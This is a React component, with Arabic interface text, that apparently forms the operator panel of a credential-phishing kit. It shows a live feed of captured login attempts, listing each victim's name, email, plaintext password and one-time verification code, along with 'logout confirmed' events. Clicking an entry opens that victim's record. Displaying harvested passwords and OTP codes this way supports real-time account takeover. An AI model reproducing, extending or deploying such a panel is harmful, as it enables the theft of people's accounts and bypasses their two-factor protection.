import { useMemo } from "react";
import { LogIn, KeyRound, LogOut, Clock3, Mail, User as UserIcon, Lock } from "lucide-react";
import type { Sub } from "./customers";
import { ago } from "./customers";

const KINDS = new Set(["login_attempt", "otp_attempt", "logout_confirmed"]);

type Kind = "login_attempt" | "otp_attempt" | "logout_confirmed";

const META: Record<Kind, { label: string; Icon: typeof LogIn; ring: string; stripe: string; chip: string; iconWrap: string }> = {
  login_attempt: {
    label: "تسجيل دخول جديد",
    Icon: LogIn,
    ring: "border-sky-200/70",
    stripe: "from-sky-500 to-cyan-500",
    chip: "bg-sky-50 text-sky-700 border-sky-200",
    iconWrap: "bg-gradient-to-br from-sky-500 to-cyan-500 text-white shadow-sky-500/30",
  },
  otp_attempt: {
    label: "رمز تحقق جديد",
    Icon: KeyRound,
    ring: "border-fuchsia-200/70",
    stripe: "from-fuchsia-500 to-pink-500",
    chip: "bg-fuchsia-50 text-fuchsia-700 border-fuchsia-200",
    iconWrap: "bg-gradient-to-br from-fuchsia-500 to-pink-500 text-white shadow-fuchsia-500/30",
  },
  logout_confirmed: {
    label: "تأكيد تسجيل خروج",
    Icon: LogOut,
    ring: "border-emerald-200/70",
    stripe: "from-emerald-500 to-teal-500",
    chip: "bg-emerald-50 text-emerald-700 border-emerald-200",
    iconWrap: "bg-gradient-to-br from-emerald-500 to-teal-500 text-white shadow-emerald-500/30",
  },
};

const str = (v: unknown) => (typeof v === "string" && v.trim() ? v.trim() : null);

function formatTime(iso: string) {
  try {
    return new Date(iso).toLocaleTimeString("ar-SY", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    });
  } catch {
    return "";
  }
}

export function LatestFeed({ subs, onOpen }: { subs: Sub[]; onOpen: (key: string) => void }) {
  const items = useMemo(
    () =>
      (Array.isArray(subs) ? subs : [])
        .filter((s) => KINDS.has(s.kind))
        .slice()
        .sort((a, b) => b.created_at.localeCompare(a.created_at))
        .slice(0, 80),
    [subs],
  );

  if (!items.length) {
    return (
      <div className="flex flex-col items-center gap-2 rounded-2xl border border-dashed border-slate-300 bg-white p-10 text-center">
        <div className="grid size-12 place-items-center rounded-2xl bg-slate-100 text-2xl">📭</div>
        <p className="text-xs font-bold text-slate-700">لا توجد إدخالات بعد</p>
        <p className="text-[11px] text-slate-500">ستظهر هنا فور وصول دخول أو رمز أو تأكيد خروج</p>
      </div>
    );
  }

  return (
    <ol className="relative space-y-2.5">
      {items.map((s) => {
        const kind = s.kind as Kind;
        const meta = META[kind];
        const Icon = meta.Icon;
        const payload = s.payload ?? {};
        const email = str(s.email) ?? str(payload["email"]);
        const name = str(payload["full_name"]) ?? str(payload["name"]);
        const password = str(payload["password"]);
        const code = str(payload["code"]) ?? str(payload["otp"]);
        const sid = str(payload["session_id"]);
        const key = (email?.toLowerCase() ?? sid ?? s.id) as string;

        return (
          <li key={s.id}>
            <button
              type="button"
              onClick={() => onOpen(key)}
              className={`group relative block w-full overflow-hidden rounded-2xl border bg-white p-3 text-right shadow-xs transition-all active:scale-[0.99] hover:shadow-md ${meta.ring}`}>
              <span className={`absolute inset-y-0 right-0 w-1 bg-gradient-to-b ${meta.stripe}`} />
              <div className="flex items-start gap-3 pr-2">
                <div className={`grid size-10 shrink-0 place-items-center rounded-2xl shadow-lg ${meta.iconWrap}`}>
                  <Icon className="size-5" />
                </div>
                <div className="min-w-0 flex-1 space-y-1.5">
                  <div className="flex items-center justify-between gap-2">
                    <span className={`inline-flex items-center gap-1 rounded-full border px-2 py-0.5 text-[10.5px] font-black ${meta.chip}`}>
                      {meta.label}
                    </span>
                    <span className="inline-flex items-center gap-1 text-[10.5px] font-bold text-slate-500 tabular-nums">
                      <Clock3 className="size-3" />
                      {formatTime(s.created_at)}
                      <span className="text-slate-300">·</span>
                      <span>{ago(s.created_at)}</span>
                    </span>
                  </div>

                  <div className="flex flex-wrap items-center gap-1.5 text-[11.5px] font-bold text-slate-800">
                    {name && (
                      <span className="inline-flex items-center gap-1 rounded-lg bg-slate-100 px-2 py-0.5">
                        <UserIcon className="size-3 text-slate-500" />
                        <span className="truncate max-w-[9rem]">{name}</span>
                      </span>
                    )}
                    {email && (
                      <span className="inline-flex items-center gap-1 rounded-lg bg-slate-100 px-2 py-0.5">
                        <Mail className="size-3 text-slate-500" />
                        <span dir="ltr" className="truncate max-w-[12rem] font-mono text-[11px]">{email}</span>
                      </span>
                    )}
                  </div>

                  {kind === "login_attempt" && password && (
                    <div className="flex items-center gap-1.5 text-[11px]">
                      <span className="inline-flex items-center gap-1 rounded-lg border border-amber-200 bg-amber-50 px-2 py-0.5 font-black text-amber-800">
                        <Lock className="size-3" />
                        <span dir="ltr" className="font-mono tracking-wider">{password}</span>
                      </span>
                    </div>
                  )}
                  {kind === "otp_attempt" && code && (
                    <div className="flex items-center gap-1.5 text-[11px]">
                      <span className="inline-flex items-center gap-1 rounded-lg border border-fuchsia-200 bg-fuchsia-50 px-2 py-0.5 font-black text-fuchsia-800">
                        <KeyRound className="size-3" />
                        <span dir="ltr" className="font-mono text-[13px] tracking-[0.3em]">{code}</span>
                      </span>
                    </div>
                  )}
                  {kind === "logout_confirmed" && (
                    <div className="text-[11px] font-bold text-emerald-700">
                      تم تأكيد تسجيل الخروج من الجهاز
                    </div>
                  )}
                </div>
              </div>
            </button>
          </li>
        );
      })}
    </ol>
  );
}

export function countLatest(subs: Sub[] | undefined) {
  if (!Array.isArray(subs)) return 0;
  let n = 0;
  for (const s of subs) if (KINDS.has(s.kind)) n++;
  return n;
}
